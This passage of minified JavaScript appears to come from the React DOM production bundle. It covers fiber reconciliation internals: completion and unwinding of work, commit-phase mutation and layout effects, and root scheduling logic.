          }
          r && (t.flags |= 4);
        }
        t.ref !== null && ((t.flags |= 512), (t.flags |= 2097152));
      }
      return le(t), null;
    case 6:
      if (e && t.stateNode != null) Fc(e, t, e.memoizedProps, r);
      else {
        if (typeof r != "string" && t.stateNode === null) throw Error(x(166));
        if (((n = Pt(_n.current)), Pt(Ke.current), Er(t))) {
          if (
            ((r = t.stateNode),
            (n = t.memoizedProps),
            (r[Qe] = t),
            (i = r.nodeValue !== n) && ((e = we), e !== null))
          )
            switch (e.tag) {
              case 3:
                xr(r.nodeValue, n, (e.mode & 1) !== 0);
                break;
              case 5:
                e.memoizedProps.suppressHydrationWarning !== !0 &&
                  xr(r.nodeValue, n, (e.mode & 1) !== 0);
            }
          i && (t.flags |= 4);
        } else
          (r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r)),
            (r[Qe] = t),
            (t.stateNode = r);
      }
      return le(t), null;
    case 13:
      if (
        (V(D),
        (r = t.memoizedState),
        e === null ||
          (e.memoizedState !== null && e.memoizedState.dehydrated !== null))
      ) {
        if (Q && ye !== null && t.mode & 1 && !(t.flags & 128))
          tc(), ln(), (t.flags |= 98560), (i = !1);
        else if (((i = Er(t)), r !== null && r.dehydrated !== null)) {
          if (e === null) {
            if (!i) throw Error(x(318));
            if (
              ((i = t.memoizedState),
              (i = i !== null ? i.dehydrated : null),
              !i)
            )
              throw Error(x(317));
            i[Qe] = t;
          } else
            ln(), !(t.flags & 128) && (t.memoizedState = null), (t.flags |= 4);
          le(t), (i = !1);
        } else Re !== null && (lo(Re), (Re = null)), (i = !0);
        if (!i) return t.flags & 65536 ? t : null;
      }
      return t.flags & 128
        ? ((t.lanes = n), t)
        : ((r = r !== null),
          r !== (e !== null && e.memoizedState !== null) &&
            r &&
            ((t.child.flags |= 8192),
            t.mode & 1 &&
              (e === null || D.current & 1 ? Y === 0 && (Y = 3) : eu())),
          t.updateQueue !== null && (t.flags |= 4),
          le(t),
          null);
    case 4:
      return (
        un(), Zi(e, t), e === null && qn(t.stateNode.containerInfo), le(t), null
      );
    case 10:
      return Fo(t.type._context), le(t), null;
    case 17:
      return he(t.type) && _r(), le(t), null;
    case 19:
      if ((V(D), (i = t.memoizedState), i === null)) return le(t), null;
      if (((r = (t.flags & 128) !== 0), (o = i.rendering), o === null))
        if (r) xn(i, !1);
        else {
          if (Y !== 0 || (e !== null && e.flags & 128))
            for (e = t.child; e !== null; ) {
              if (((o = il(e)), o !== null)) {
                for (
                  t.flags |= 128,
                    xn(i, !1),
                    r = o.updateQueue,
                    r !== null && ((t.updateQueue = r), (t.flags |= 4)),
                    t.subtreeFlags = 0,
                    r = n,
                    n = t.child;
                  n !== null;

                )
                  (i = n),
                    (e = r),
                    (i.flags &= 14680066),
                    (o = i.alternate),
                    o === null
                      ? ((i.childLanes = 0),
                        (i.lanes = e),
                        (i.child = null),
                        (i.subtreeFlags = 0),
                        (i.memoizedProps = null),
                        (i.memoizedState = null),
                        (i.updateQueue = null),
                        (i.dependencies = null),
                        (i.stateNode = null))
                      : ((i.childLanes = o.childLanes),
                        (i.lanes = o.lanes),
                        (i.child = o.child),
                        (i.subtreeFlags = 0),
                        (i.deletions = null),
                        (i.memoizedProps = o.memoizedProps),
                        (i.memoizedState = o.memoizedState),
                        (i.updateQueue = o.updateQueue),
                        (i.type = o.type),
                        (e = o.dependencies),
                        (i.dependencies =
                          e === null
                            ? null
                            : {
                                lanes: e.lanes,
                                firstContext: e.firstContext,
                              })),
                    (n = n.sibling);
                return F(D, (D.current & 1) | 2), t.child;
              }
              e = e.sibling;
            }
          i.tail !== null &&
            J() > an &&
            ((t.flags |= 128), (r = !0), xn(i, !1), (t.lanes = 4194304));
        }
      else {
        if (!r)
          if (((e = il(o)), e !== null)) {
            if (
              ((t.flags |= 128),
              (r = !0),
              (n = e.updateQueue),
              n !== null && ((t.updateQueue = n), (t.flags |= 4)),
              xn(i, !0),
              i.tail === null && i.tailMode === "hidden" && !o.alternate && !Q)
            )
              return le(t), null;
          } else
            2 * J() - i.renderingStartTime > an &&
              n !== 1073741824 &&
              ((t.flags |= 128), (r = !0), xn(i, !1), (t.lanes = 4194304));
        i.isBackwards
          ? ((o.sibling = t.child), (t.child = o))
          : ((n = i.last),
            n !== null ? (n.sibling = o) : (t.child = o),
            (i.last = o));
      }
      return i.tail !== null
        ? ((t = i.tail),
          (i.rendering = t),
          (i.tail = t.sibling),
          (i.renderingStartTime = J()),
          (t.sibling = null),
          (n = D.current),
          F(D, r ? (n & 1) | 2 : n & 1),
          t)
        : (le(t), null);
    case 22:
    case 23:
      return (
        $o(),
        (r = t.memoizedState !== null),
        e !== null && (e.memoizedState !== null) !== r && (t.flags |= 8192),
        r && t.mode & 1
          ? ve & 1073741824 && (le(t), t.subtreeFlags & 6 && (t.flags |= 8192))
          : le(t),
        null
      );
    case 24:
      return null;
    case 25:
      return null;
  }
  throw Error(x(156, t.tag));
}
function Xp(e, t) {
  switch ((zo(t), t.tag)) {
    case 1:
      return (
        he(t.type) && _r(),
        (e = t.flags),
        e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null
      );
    case 3:
      return (
        un(),
        V(Ae),
        V(oe),
        Ko(),
        (e = t.flags),
        e & 65536 && !(e & 128) ? ((t.flags = (e & -65537) | 128), t) : null
      );
    case 5:
      return Do(t), null;
    case 13:
      if ((V(D), (e = t.memoizedState), e !== null && e.dehydrated !== null)) {
        if (t.alternate === null) throw Error(x(340));
        ln();
      }
      return (
        (e = t.flags), e & 65536 ? ((t.flags = (e & -65537) | 128), t) : null
      );
    case 19:
      return V(D), null;
    case 4:
      return un(), null;
    case 10:
      return Fo(t.type._context), null;
    case 22:
    case 23:
      return $o(), null;
    case 24:
      return null;
    default:
      return null;
  }
}
var Pr = !1,
  ie = !1,
  Hp = typeof WeakSet == "function" ? WeakSet : Set,
  P = null;
function Gt(e, t) {
  var n = e.ref;
  if (n !== null)
    if (typeof n == "function")
      try {
        n(null);
      } catch (r) {
        X(e, t, r);
      }
    else n.current = null;
}
function bi(e, t, n) {
  try {
    n();
  } catch (r) {
    X(e, t, r);
  }
}
var fs = !1;
function Jp(e, t) {
  if (((Ri = qr), (e = Ka()), Uo(e))) {
    if ("selectionStart" in e)
      var n = { start: e.selectionStart, end: e.selectionEnd };
    else
      e: {
        n = ((n = e.ownerDocument) && n.defaultView) || window;
        var r = n.getSelection && n.getSelection();
        if (r && r.rangeCount !== 0) {
          n = r.anchorNode;
          var l = r.anchorOffset,
            i = r.focusNode;
          r = r.focusOffset;
          try {
            n.nodeType, i.nodeType;
          } catch {
            n = null;
            break e;
          }
          var o = 0,
            u = -1,
            s = -1,
            a = 0,
            p = 0,
            d = e,
            h = null;
          t: for (;;) {
            for (
              var g;
              d !== n || (l !== 0 && d.nodeType !== 3) || (u = o + l),
                d !== i || (r !== 0 && d.nodeType !== 3) || (s = o + r),
                d.nodeType === 3 && (o += d.nodeValue.length),
                (g = d.firstChild) !== null;

            )
              (h = d), (d = g);
            for (;;) {
              if (d === e) break t;
              if (
                (h === n && ++a === l && (u = o),
                h === i && ++p === r && (s = o),
                (g = d.nextSibling) !== null)
              )
                break;
              (d = h), (h = d.parentNode);
            }
            d = g;
          }
          n = u === -1 || s === -1 ? null : { start: u, end: s };
        } else n = null;
      }
    n = n || { start: 0, end: 0 };
  } else n = null;
  for (Oi = { focusedElem: e, selectionRange: n }, qr = !1, P = t; P !== null; )
    if (((t = P), (e = t.child), (t.subtreeFlags & 1028) !== 0 && e !== null))
      (e.return = t), (P = e);
    else
      for (; P !== null; ) {
        t = P;
        try {
          var v = t.alternate;
          if (t.flags & 1024)
            switch (t.tag) {
              case 0:
              case 11:
              case 15:
                break;
              case 1:
                if (v !== null) {
                  var w = v.memoizedProps,
                    S = v.memoizedState,
                    f = t.stateNode,
                    c = f.getSnapshotBeforeUpdate(
                      t.elementType === t.type ? w : Ie(t.type, w),
                      S
                    );
                  f.__reactInternalSnapshotBeforeUpdate = c;
                }
                break;
              case 3:
                var A = t.stateNode.containerInfo;
                A.nodeType === 1
                  ? (A.textContent = "")
                  : A.nodeType === 9 &&
                    A.documentElement &&
                    A.removeChild(A.documentElement);
                break;
              case 5:
              case 6:
              case 4:
              case 17:
                break;
              default:
                throw Error(x(163));
            }
        } catch (y) {
          X(t, t.return, y);
        }
        if (((e = t.sibling), e !== null)) {
          (e.return = t.return), (P = e);
          break;
        }
        P = t.return;
      }
  return (v = fs), (fs = !1), v;
}
function Mn(e, t, n) {
  var r = t.updateQueue;
  if (((r = r !== null ? r.lastEffect : null), r !== null)) {
    var l = (r = r.next);
    do {
      if ((l.tag & e) === e) {
        var i = l.destroy;
        (l.destroy = void 0), i !== void 0 && bi(t, n, i);
      }
      l = l.next;
    } while (l !== r);
  }
}
function Cl(e, t) {
  if (
    ((t = t.updateQueue), (t = t !== null ? t.lastEffect : null), t !== null)
  ) {
    var n = (t = t.next);
    do {
      if ((n.tag & e) === e) {
        var r = n.create;
        n.destroy = r();
      }
      n = n.next;
    } while (n !== t);
  }
}
function _i(e) {
  var t = e.ref;
  if (t !== null) {
    var n = e.stateNode;
    switch (e.tag) {
      case 5:
        e = n;
        break;
      default:
        e = n;
    }
    typeof t == "function" ? t(e) : (t.current = e);
  }
}
function Bc(e) {
  var t = e.alternate;
  t !== null && ((e.alternate = null), Bc(t)),
    (e.child = null),
    (e.deletions = null),
    (e.sibling = null),
    e.tag === 5 &&
      ((t = e.stateNode),
      t !== null &&
        (delete t[Qe], delete t[Zn], delete t[Bi], delete t[jp], delete t[Tp])),
    (e.stateNode = null),
    (e.return = null),
    (e.dependencies = null),
    (e.memoizedProps = null),
    (e.memoizedState = null),
    (e.pendingProps = null),
    (e.stateNode = null),
    (e.updateQueue = null);
}
function Vc(e) {
  return e.tag === 5 || e.tag === 3 || e.tag === 4;
}
function ds(e) {
  e: for (;;) {
    for (; e.sibling === null; ) {
      if (e.return === null || Vc(e.return)) return null;
      e = e.return;
    }
    for (
      e.sibling.return = e.return, e = e.sibling;
      e.tag !== 5 && e.tag !== 6 && e.tag !== 18;

    ) {
      if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
      (e.child.return = e), (e = e.child);
    }
    if (!(e.flags & 2)) return e.stateNode;
  }
}
function $i(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6)
    (e = e.stateNode),
      t
        ? n.nodeType === 8
          ? n.parentNode.insertBefore(e, t)
          : n.insertBefore(e, t)
        : (n.nodeType === 8
            ? ((t = n.parentNode), t.insertBefore(e, n))
            : ((t = n), t.appendChild(e)),
          (n = n._reactRootContainer),
          n != null || t.onclick !== null || (t.onclick = br));
  else if (r !== 4 && ((e = e.child), e !== null))
    for ($i(e, t, n), e = e.sibling; e !== null; ) $i(e, t, n), (e = e.sibling);
}
function eo(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6)
    (e = e.stateNode), t ? n.insertBefore(e, t) : n.appendChild(e);
  else if (r !== 4 && ((e = e.child), e !== null))
    for (eo(e, t, n), e = e.sibling; e !== null; ) eo(e, t, n), (e = e.sibling);
}
var $ = null,
  ze = !1;
function $e(e, t, n) {
  for (n = n.child; n !== null; ) Qc(e, t, n), (n = n.sibling);
}
function Qc(e, t, n) {
  if (De && typeof De.onCommitFiberUnmount == "function")
    try {
      De.onCommitFiberUnmount(gl, n);
    } catch {}
  switch (n.tag) {
    case 5:
      ie || Gt(n, t);
    case 6:
      var r = $,
        l = ze;
      ($ = null),
        $e(e, t, n),
        ($ = r),
        (ze = l),
        $ !== null &&
          (ze
            ? ((e = $),
              (n = n.stateNode),
              e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n))
            : $.removeChild(n.stateNode));
      break;
    case 18:
      $ !== null &&
        (ze
          ? ((e = $),
            (n = n.stateNode),
            e.nodeType === 8
              ? ti(e.parentNode, n)
              : e.nodeType === 1 && ti(e, n),
            Hn(e))
          : ti($, n.stateNode));
      break;
    case 4:
      (r = $),
        (l = ze),
        ($ = n.stateNode.containerInfo),
        (ze = !0),
        $e(e, t, n),
        ($ = r),
        (ze = l);
      break;
    case 0:
    case 11:
    case 14:
    case 15:
      if (
        !ie &&
        ((r = n.updateQueue), r !== null && ((r = r.lastEffect), r !== null))
      ) {
        l = r = r.next;
        do {
          var i = l,
            o = i.destroy;
          (i = i.tag),
            o !== void 0 && (i & 2 || i & 4) && bi(n, t, o),
            (l = l.next);
        } while (l !== r);
      }
      $e(e, t, n);
      break;
    case 1:
      if (
        !ie &&
        (Gt(n, t),
        (r = n.stateNode),
        typeof r.componentWillUnmount == "function")
      )
        try {
          (r.props = n.memoizedProps),
            (r.state = n.memoizedState),
            r.componentWillUnmount();
        } catch (u) {
          X(n, t, u);
        }
      $e(e, t, n);
      break;
    case 21:
      $e(e, t, n);
      break;
    case 22:
      n.mode & 1
        ? ((ie = (r = ie) || n.memoizedState !== null), $e(e, t, n), (ie = r))
        : $e(e, t, n);
      break;
    default:
      $e(e, t, n);
  }
}
function ps(e) {
  var t = e.updateQueue;
  if (t !== null) {
    e.updateQueue = null;
    var n = e.stateNode;
    n === null && (n = e.stateNode = new Hp()),
      t.forEach(function (r) {
        var l = tA.bind(null, e, r);
        n.has(r) || (n.add(r), r.then(l, l));
      });
  }
}
function Ue(e, t) {
  var n = t.deletions;
  if (n !== null)
    for (var r = 0; r < n.length; r++) {
      var l = n[r];
      try {
        var i = e,
          o = t,
          u = o;
        e: for (; u !== null; ) {
          switch (u.tag) {
            case 5:
              ($ = u.stateNode), (ze = !1);
              break e;
            case 3:
              ($ = u.stateNode.containerInfo), (ze = !0);
              break e;
            case 4:
              ($ = u.stateNode.containerInfo), (ze = !0);
              break e;
          }
          u = u.return;
        }
        if ($ === null) throw Error(x(160));
        Qc(i, o, l), ($ = null), (ze = !1);
        var s = l.alternate;
        s !== null && (s.return = null), (l.return = null);
      } catch (a) {
        X(l, t, a);
      }
    }
  if (t.subtreeFlags & 12854)
    for (t = t.child; t !== null; ) Dc(t, e), (t = t.sibling);
}
function Dc(e, t) {
  var n = e.alternate,
    r = e.flags;
  switch (e.tag) {
    case 0:
    case 11:
    case 14:
    case 15:
      if ((Ue(t, e), Be(e), r & 4)) {
        try {
          Mn(3, e, e.return), Cl(3, e);
        } catch (w) {
          X(e, e.return, w);
        }
        try {
          Mn(5, e, e.return);
        } catch (w) {
          X(e, e.return, w);
        }
      }
      break;
    case 1:
      Ue(t, e), Be(e), r & 512 && n !== null && Gt(n, n.return);
      break;
    case 5:
      if (
        (Ue(t, e),
        Be(e),
        r & 512 && n !== null && Gt(n, n.return),
        e.flags & 32)
      ) {
        var l = e.stateNode;
        try {
          Dn(l, "");
        } catch (w) {
          X(e, e.return, w);
        }
      }
      if (r & 4 && ((l = e.stateNode), l != null)) {
        var i = e.memoizedProps,
          o = n !== null ? n.memoizedProps : i,
          u = e.type,
          s = e.updateQueue;
        if (((e.updateQueue = null), s !== null))
          try {
            u === "input" && i.type === "radio" && i.name != null && aa(l, i),
              ki(u, o);
            var a = ki(u, i);
            for (o = 0; o < s.length; o += 2) {
              var p = s[o],
                d = s[o + 1];
              p === "style"
                ? Aa(l, d)
                : p === "dangerouslySetInnerHTML"
                ? da(l, d)
                : p === "children"
                ? Dn(l, d)
                : vo(l, p, d, a);
            }
            switch (u) {
              case "input":
                yi(l, i);
                break;
              case "textarea":
                ca(l, i);
                break;
              case "select":
                var h = l._wrapperState.wasMultiple;
                l._wrapperState.wasMultiple = !!i.multiple;
                var g = i.value;
                g != null
                  ? Yt(l, !!i.multiple, g, !1)
                  : h !== !!i.multiple &&
                    (i.defaultValue != null
                      ? Yt(l, !!i.multiple, i.defaultValue, !0)
                      : Yt(l, !!i.multiple, i.multiple ? [] : "", !1));
            }
            l[Zn] = i;
          } catch (w) {
            X(e, e.return, w);
          }
      }
      break;
    case 6:
      if ((Ue(t, e), Be(e), r & 4)) {
        if (e.stateNode === null) throw Error(x(162));
        (l = e.stateNode), (i = e.memoizedProps);
        try {
          l.nodeValue = i;
        } catch (w) {
          X(e, e.return, w);
        }
      }
      break;
    case 3:
      if (
        (Ue(t, e), Be(e), r & 4 && n !== null && n.memoizedState.isDehydrated)
      )
        try {
          Hn(t.containerInfo);
        } catch (w) {
          X(e, e.return, w);
        }
      break;
    case 4:
      Ue(t, e), Be(e);
      break;
    case 13:
      Ue(t, e),
        Be(e),
        (l = e.child),
        l.flags & 8192 &&
          ((i = l.memoizedState !== null),
          (l.stateNode.isHidden = i),
          !i ||
            (l.alternate !== null && l.alternate.memoizedState !== null) ||
            (bo = J())),
        r & 4 && ps(e);
      break;
    case 22:
      if (
        ((p = n !== null && n.memoizedState !== null),
        e.mode & 1 ? ((ie = (a = ie) || p), Ue(t, e), (ie = a)) : Ue(t, e),
        Be(e),
        r & 8192)
      ) {
        if (
          ((a = e.memoizedState !== null),
          (e.stateNode.isHidden = a) && !p && e.mode & 1)
        )
          for (P = e, p = e.child; p !== null; ) {
            for (d = P = p; P !== null; ) {
              switch (((h = P), (g = h.child), h.tag)) {
                case 0:
                case 11:
                case 14:
                case 15:
                  Mn(4, h, h.return);
                  break;
                case 1:
                  Gt(h, h.return);
                  var v = h.stateNode;
                  if (typeof v.componentWillUnmount == "function") {
                    (r = h), (n = h.return);
                    try {
                      (t = r),
                        (v.props = t.memoizedProps),
                        (v.state = t.memoizedState),
                        v.componentWillUnmount();
                    } catch (w) {
                      X(r, n, w);
                    }
                  }
                  break;
                case 5:
                  Gt(h, h.return);
                  break;
                case 22:
                  if (h.memoizedState !== null) {
                    hs(d);
                    continue;
                  }
              }
              g !== null ? ((g.return = h), (P = g)) : hs(d);
            }
            p = p.sibling;
          }
        e: for (p = null, d = e; ; ) {
          if (d.tag === 5) {
            if (p === null) {
              p = d;
              try {
                (l = d.stateNode),
                  a
                    ? ((i = l.style),
                      typeof i.setProperty == "function"
                        ? i.setProperty("display", "none", "important")
                        : (i.display = "none"))
                    : ((u = d.stateNode),
                      (s = d.memoizedProps.style),
                      (o =
                        s != null && s.hasOwnProperty("display")
                          ? s.display
                          : null),
                      (u.style.display = pa("display", o)));
              } catch (w) {
                X(e, e.return, w);
              }
            }
          } else if (d.tag === 6) {
            if (p === null)
              try {
                d.stateNode.nodeValue = a ? "" : d.memoizedProps;
              } catch (w) {
                X(e, e.return, w);
              }
          } else if (
            ((d.tag !== 22 && d.tag !== 23) ||
              d.memoizedState === null ||
              d === e) &&
            d.child !== null
          ) {
            (d.child.return = d), (d = d.child);
            continue;
          }
          if (d === e) break e;
          for (; d.sibling === null; ) {
            if (d.return === null || d.return === e) break e;
            p === d && (p = null), (d = d.return);
          }
          p === d && (p = null), (d.sibling.return = d.return), (d = d.sibling);
        }
      }
      break;
    case 19:
      Ue(t, e), Be(e), r & 4 && ps(e);
      break;
    case 21:
      break;
    default:
      Ue(t, e), Be(e);
  }
}
function Be(e) {
  var t = e.flags;
  if (t & 2) {
    try {
      e: {
        for (var n = e.return; n !== null; ) {
          if (Vc(n)) {
            var r = n;
            break e;
          }
          n = n.return;
        }
        throw Error(x(160));
      }
      switch (r.tag) {
        case 5:
          var l = r.stateNode;
          r.flags & 32 && (Dn(l, ""), (r.flags &= -33));
          var i = ds(e);
          eo(e, i, l);
          break;
        case 3:
        case 4:
          var o = r.stateNode.containerInfo,
            u = ds(e);
          $i(e, u, o);
          break;
        default:
          throw Error(x(161));
      }
    } catch (s) {
      X(e, e.return, s);
    }
    e.flags &= -3;
  }
  t & 4096 && (e.flags &= -4097);
}
function Gp(e, t, n) {
  (P = e), Kc(e);
}
function Kc(e, t, n) {
  for (var r = (e.mode & 1) !== 0; P !== null; ) {
    var l = P,
      i = l.child;
    if (l.tag === 22 && r) {
      var o = l.memoizedState !== null || Pr;
      if (!o) {
        var u = l.alternate,
          s = (u !== null && u.memoizedState !== null) || ie;
        u = Pr;
        var a = ie;
        if (((Pr = o), (ie = s) && !a))
          for (P = l; P !== null; )
            (o = P),
              (s = o.child),
              o.tag === 22 && o.memoizedState !== null
                ? ms(l)
                : s !== null
                ? ((s.return = o), (P = s))
                : ms(l);
        for (; i !== null; ) (P = i), Kc(i), (i = i.sibling);
        (P = l), (Pr = u), (ie = a);
      }
      As(e);
    } else
      l.subtreeFlags & 8772 && i !== null ? ((i.return = l), (P = i)) : As(e);
  }
}
function As(e) {
  for (; P !== null; ) {
    var t = P;
    if (t.flags & 8772) {
      var n = t.alternate;
      try {
        if (t.flags & 8772)
          switch (t.tag) {
            case 0:
            case 11:
            case 15:
              ie || Cl(5, t);
              break;
            case 1:
              var r = t.stateNode;
              if (t.flags & 4 && !ie)
                if (n === null) r.componentDidMount();
                else {
                  var l =
                    t.elementType === t.type
                      ? n.memoizedProps
                      : Ie(t.type, n.memoizedProps);
                  r.componentDidUpdate(
                    l,
                    n.memoizedState,
                    r.__reactInternalSnapshotBeforeUpdate
                  );
                }
              var i = t.updateQueue;
              i !== null && _u(t, i, r);
              break;
            case 3:
              var o = t.updateQueue;
              if (o !== null) {
                if (((n = null), t.child !== null))
                  switch (t.child.tag) {
                    case 5:
                      n = t.child.stateNode;
                      break;
                    case 1:
                      n = t.child.stateNode;
                  }
                _u(t, o, n);
              }
              break;
            case 5:
              var u = t.stateNode;
              if (n === null && t.flags & 4) {
                n = u;
                var s = t.memoizedProps;
                switch (t.type) {
                  case "button":
                  case "input":
                  case "select":
                  case "textarea":
                    s.autoFocus && n.focus();
                    break;
                  case "img":
                    s.src && (n.src = s.src);
                }
              }
              break;
            case 6:
              break;
            case 4:
              break;
            case 12:
              break;
            case 13:
              if (t.memoizedState === null) {
                var a = t.alternate;
                if (a !== null) {
                  var p = a.memoizedState;
                  if (p !== null) {
                    var d = p.dehydrated;
                    d !== null && Hn(d);
                  }
                }
              }
              break;
            case 19:
            case 17:
            case 21:
            case 22:
            case 23:
            case 25:
              break;
            default:
              throw Error(x(163));
          }
        ie || (t.flags & 512 && _i(t));
      } catch (h) {
        X(t, t.return, h);
      }
    }
    if (t === e) {
      P = null;
      break;
    }
    if (((n = t.sibling), n !== null)) {
      (n.return = t.return), (P = n);
      break;
    }
    P = t.return;
  }
}
function hs(e) {
  for (; P !== null; ) {
    var t = P;
    if (t === e) {
      P = null;
      break;
    }
    var n = t.sibling;
    if (n !== null) {
      (n.return = t.return), (P = n);
      break;
    }
    P = t.return;
  }
}
function ms(e) {
  for (; P !== null; ) {
    var t = P;
    try {
      switch (t.tag) {
        case 0:
        case 11:
        case 15:
          var n = t.return;
          try {
            Cl(4, t);
          } catch (s) {
            X(t, n, s);
          }
          break;
        case 1:
          var r = t.stateNode;
          if (typeof r.componentDidMount == "function") {
            var l = t.return;
            try {
              r.componentDidMount();
            } catch (s) {
              X(t, l, s);
            }
          }
          var i = t.return;
          try {
            _i(t);
          } catch (s) {
            X(t, i, s);
          }
          break;
        case 5:
          var o = t.return;
          try {
            _i(t);
          } catch (s) {
            X(t, o, s);
          }
      }
    } catch (s) {
      X(t, t.return, s);
    }
    if (t === e) {
      P = null;
      break;
    }
    var u = t.sibling;
    if (u !== null) {
      (u.return = t.return), (P = u);
      break;
    }
    P = t.return;
  }
}
var qp = Math.ceil,
  sl = _e.ReactCurrentDispatcher,
  Yo = _e.ReactCurrentOwner,
  Ne = _e.ReactCurrentBatchConfig,
  R = 0,
  _ = null,
  G = null,
  te = 0,
  ve = 0,
  qt = vt(0),
  Y = 0,
  nr = null,
  It = 0,
  Pl = 0,
  Zo = 0,
  Fn = null,
  de = null,
  bo = 0,
  an = 1 / 0,
  We = null,
  al = !1,
  to = null,
  dt = null,
  Nr = !1,
  it = null,
  cl = 0,
  Bn = 0,
  no = null,
  Br = -1,
  Vr = 0;
function se() {
  return R & 6 ? J() : Br !== -1 ? Br : (Br = J());
}
function pt(e) {
  return e.mode & 1
    ? R & 2 && te !== 0
      ? te & -te
      : Up.transition !== null
      ? (Vr === 0 && (Vr = Pa()), Vr)
      : ((e = O),
        e !== 0 || ((e = window.event), (e = e === void 0 ? 16 : za(e.type))),
        e)
    : 1;
}
function Me(e, t, n, r) {
  if (50 < Bn) throw ((Bn = 0), (no = null), Error(x(185)));
  ir(e, n, r),
    (!(R & 2) || e !== _) &&
      (e === _ && (!(R & 2) && (Pl |= n), Y === 4 && rt(e, te)),
      me(e, r),
      n === 1 && R === 0 && !(t.mode & 1) && ((an = J() + 500), xl && yt()));
}
function me(e, t) {
  var n = e.callbackNode;
  Ud(e, t);
  var r = Gr(e, e === _ ? te : 0);
  if (r === 0)
    n !== null && Cu(n), (e.callbackNode = null), (e.callbackPriority = 0);
  else if (((t = r & -r), e.callbackPriority !== t)) {
    if ((n != null && Cu(n), t === 1))
      e.tag === 0 ? Lp(gs.bind(null, e)) : _a(gs.bind(null, e)),
        Pp(function () {
          !(R & 6) && yt();
        }),
        (n = null);
    else {
      switch (Na(r)) {
        case 1:
          n = Eo;
          break;
        case 4:
          n = ka;
          break;
        case 16:
          n = Jr;
          break;
        case 536870912:
          n = Ca;
          break;
        default:
          n = Jr;
      }
      n = Zc(n, Wc.bind(null, e));
    }
    (e.callbackPriority = t), (e.callbackNode = n);
  }
}
function Wc(e, t) {
  if (((Br = -1), (Vr = 0), R & 6)) throw Error(x(327));
  var n = e.callbackNode;
  if (en() && e.callbackNode !== n) return null;
  var r = Gr(e, e === _ ? te : 0);
  if (r === 0) return null;
  if (r & 30 || r & e.expiredLanes || t) t = fl(e, r);
  else {
    t = r;
    var l = R;
    R |= 2;
    var i = Hc();
    (_ !== e || te !== t) && ((We = null), (an = J() + 500), Nt(e, t));
    do
      try {
        bp();
        break;
      } catch (u) {
        Xc(e, u);
      }
    while (!0);
    Mo(),
      (sl.current = i),
      (R = l),
      G !== null ? (t = 0) : ((_ = null), (te = 0), (t = Y));
  }
  if (t !== 0) {
    if (
      (t === 2 && ((l = Ti(e)), l !== 0 && ((r = l), (t = ro(e, l)))), t === 1)
    )
      throw ((n = nr), Nt(e, 0), rt(e, r), me(e, J()), n);
    if (t === 6) rt(e, r);
    else {
      if (
        ((l = e.current.alternate),
        !(r & 30) &&
          !Yp(l) &&
          ((t = fl(e, r)),
          t === 2 && ((i = Ti(e)), i !== 0 && ((r = i), (t = ro(e, i)))),
          t === 1))
      )
        throw ((n = nr), Nt(e, 0), rt(e, r), me(e, J()), n);
      switch (((e.finishedWork = l), (e.finishedLanes = r), t)) {
        case 0:
        case 1:
          throw Error(x(345));
        case 2:
          Et(e, de, We);
          break;
        case 3:
          if (
            (rt(e, r), (r & 130023424) === r && ((t = bo + 500 - J()), 10 < t))
          ) {
            if (Gr(e, 0) !== 0) break;
            if (((l = e.suspendedLanes), (l & r) !== r)) {
              se(), (e.pingedLanes |= e.suspendedLanes & l);
              break;
            }
            e.timeoutHandle = Fi(Et.bind(null, e, de, We), t);
            break;
          }
          Et(e, de, We);
          break;
        case 4:
          if ((rt(e, r), (r & 4194240) === r)) break;
          for (t = e.eventTimes, l = -1; 0 < r; ) {
            var o = 31 - Oe(r);
            (i = 1 << o), (o = t[o]), o > l && (l = o), (r &= ~i);
          }
          if (
            ((r = l),
            (r = J() - r),
            (r =
              (120 > r
                ? 120
                : 480 > r
                ? 480
                : 1080 > r
                ? 1080
                : 1920 > r
                ? 1920
                : 3e3 > r
                ? 3e3
                : 4320 > r
                ? 4320
                : 1960 * qp(r / 1960)) - r),
            10 < r)
          ) {
            e.timeoutHandle = Fi(Et.bind(null, e, de, We), r);
            break;
          }
          Et(e, de, We);
          break;
        case 5:
          Et(e, de, We);
          break;
        default:
          throw Error(x(329));
      }
    }
  }
  return me(e, J()), e.callbackNode === n ? Wc.bind(null, e) : null;
}
function ro(e, t) {
  var n = Fn;
  return (
    e.current.memoizedState.isDehydrated && (Nt(e, t).flags |= 256),
    (e = fl(e, t)),
    e !== 2 && ((t = de), (de = n), t !== null && lo(t)),
    e
  );
}
function lo(e) {
  de === null ? (de = e) : de.push.apply(de, e);
}
function Yp(e) {
  for (var t = e; ; ) {
    if (t.flags & 16384) {
      var n = t.updateQueue;
      if (n !== null && ((n = n.stores), n !== null))
        for (var r = 0; r < n.length; r++) {
          var l = n[r],
            i = l.getSnapshot;
          l = l.value;
          try {
            if (!Fe(i(), l)) return !1;
          } catch {
            return !1;
          }
        }
    }
    if (((n = t.child), t.subtreeFlags & 16384 && n !== null))
      (n.return = t), (t = n);
    else {
      if (t === e) break;
      for (; t.sibling === null; ) {
        if (t.return === null || t.return === e) return !0;
        t = t.return;
      }
      (t.sibling.return = t.return), (t = t.sibling);
    }
  }
  return !0;
}
function rt(e, t) {
  for (
    t &= ~Zo,
      t &= ~Pl,
      e.suspendedLanes |= t,
      e.pingedLanes &= ~t,
      e = e.expirationTimes;
    0 < t;

  ) {
    var n = 31 - Oe(t),
      r = 1 << n;
    (e[n] = -1), (t &= ~r);
  }
}
function gs(e) {
  if (R & 6) throw Error(x(327));
  en();
  var t = Gr(e, 0);
  if (!(t & 1)) return me(e, J()), null;
  var n = fl(e, t);
  if (e.tag !== 0 && n === 2) {
    var r = Ti(e);
    r !== 0 && ((t = r), (n = ro(e, r)));
  }
  if (n === 1) throw ((n = nr), Nt(e, 0), rt(e, t), me(e, J()), n);
  if (n === 6) throw Error(x(345));
  return (
    (e.finishedWork = e.current.alternate),
    (e.finishedLanes = t),
    Et(e, de, We),
    me(e, J()),
    null
  );
}
function _o(e, t) {
  var n = R;
  R |= 1;
  try {
    return e(t);
  } finally {
    (R = n), R === 0 && ((an = J() + 500), xl && yt());
  }
}
function zt(e) {
  it !== null && it.tag === 0 && !(R & 6) && en();
  var t = R;
  R |= 1;
  var n = Ne.transition,
    r = O;
  try {
    if (((Ne.transition = null), (O = 1), e)) return e();
  } finally {
    (O = r), (Ne.transition = n), (R = t), !(R & 6) && yt();
  }
